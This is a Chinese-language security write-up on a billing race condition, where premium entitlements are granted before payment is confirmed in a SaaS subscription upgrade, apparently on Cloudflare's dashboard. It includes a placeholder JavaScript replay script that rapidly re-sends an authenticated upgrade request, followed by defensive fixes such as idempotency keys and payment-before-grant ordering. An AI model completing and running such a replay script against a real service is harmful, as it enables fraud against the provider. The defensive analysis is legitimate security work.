## 一、背景：从“白嫖叙事”到“计费链路安全”

本文描述的是一个典型的 SaaS 计费链路风险：在订阅升级流程中，**权限发放**与**支付确认**发生了短暂错位，导致账户可能在未完成有效支付的情况下短时获得高级权益。

相比“怎么利用”，真正有价值的问题是：

1. 为什么会发生状态错位？
2. 哪些代码路径容易触发竞态？
3. 平台应如何修复？

---

## 二、代码层行为分析（基于公开脚本）

公开脚本本质是一个“高频异步重放器”，关键行为只有三点：

1. 复用一次合法会话中的请求头与载荷；
2. 以极短间隔重复触发同一路径；
3. 利用后端并发处理窗口，博弈状态写入顺序。

下面是基于原思路整理后的**研究用占位脚本**（关键敏感位全部占位）：

```js
/**
 * Subscription Flow Replay Skeleton（研究用）
 * 关键敏感参数已占位，不可直接复现攻击
 */

const url = 'PASTE_ENDPOINT_URL';

const headers = {
  'content-type': 'application/json',
  'accept': '*/*',
  'origin': 'https://dash.cloudflare.com',
  'referer': 'https://dash.cloudflare.com/',
  'x-atok': 'PASTE_X_ATOK',
  'cookie': 'PASTE_SESSION_COOKIE',
  'user-agent': 'Mozilla/5.0 ...'
};

const payload = {
  // PASTE_REQUEST_PAYLOAD
};

const delay = ms => new Promise(r => setTimeout(r, ms));

(async () => {
  for (let i = 0; i < 10; i++) {
    fetch(url, {
      method: 'POST',
      headers,
      body: JSON.stringify(payload)
    })
      .then(res => console.log(`[${i}] status=`, res.status))
      .catch(err => console.error(`[${i}] err=`, err));

    await delay(100);
  }
})();
```

### 我们的见解（关键）

从工程角度看，它并不复杂，重点在于后端是否满足以下危险条件：

- `grant_entitlement()` 早于 `charge_confirmed()` 执行；
- 缺少幂等键，重复请求可多次进入关键逻辑；
- 权限写入与账单写入不在同一事务边界；
- 失败补偿任务存在延迟或漏执行。

一句话：**问题不在脚本“高级”，而在业务状态机“可被抢跑”。**

进一步说，很多团队把计费看成“业务功能”，却没按“安全边界”治理：

- 登录/风控链路通常有严格原子性设计；
- 计费链路却常见异步拼接和弱一致；
- 最终导致“权限先开，资金后补”的天然窗口。

这类漏洞的核心修复，不是加 WAF 规则，而是重建状态机约束。
---

## 三、风险本质：业务状态机设计缺陷

如果订阅流程是：

`接收升级请求 -> 写入高级权限 -> 异步校验支付 -> 回滚失败订单`

那么在高并发下，就可能出现“权限先可用、账单后失败”的窗口期。这属于典型的：

- TOCTOU（检查与使用时序分离）
- 分布式一致性处理不完整
- 事务边界跨服务后未做强约束

---

## 四、防守侧修复建议（可直接落地）

### 1) 先支付后授权（强顺序）
将“权限生效”移动到支付网关回执确认之后，未确认前只允许 `pending` 态。

### 2) 幂等与去重
对升级请求强制 `Idempotency-Key`，同一键只允许一次状态推进。

### 3) 单事务或 Saga 强补偿
权限与账单落库尽量同事务；跨服务时使用 Saga + 可审计补偿，且补偿必须可重试。

### 4) 权限实时二次校验
在关键能力入口增加账单态校验，不仅依赖“历史已授权标记”。

### 5) 风控检测
对短时密集相同升级请求进行限速、熔断与告警（如 100ms 间隔重复提交）。

## 五、给研究者与平台方的结论

- 对研究者：把关注点从“能不能白嫖”升级为“如何定位状态机缺陷”。
- 对平台方：计费系统是安全边界的一部分，**一致性设计 = 资金安全 + 品牌安全**。

安全研究真正的价值，不是放大利用，而是让系统变得更难被利用。
